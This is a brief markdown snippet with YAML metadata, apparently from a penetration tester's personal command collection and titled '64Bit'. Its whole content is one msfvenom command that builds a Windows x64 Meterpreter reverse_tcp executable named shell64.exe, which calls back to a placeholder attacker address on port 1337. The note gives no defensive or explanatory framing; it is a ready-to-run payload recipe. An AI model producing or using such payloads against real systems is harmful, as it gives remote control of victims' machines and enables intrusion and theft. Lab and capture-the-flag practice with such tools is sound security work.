---
id: df34a083-9348-42b4-a2b8-bf6ab76c9ef5
name: 64Bit
type: command
executor: bash
data: 'msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.12.XX
  lport=1337 -f exe > shell64.exe

  '
output: null
created_at: '2020-07-14T18:14:34.234395+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# 64Bit

```bash
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell64.exe

```
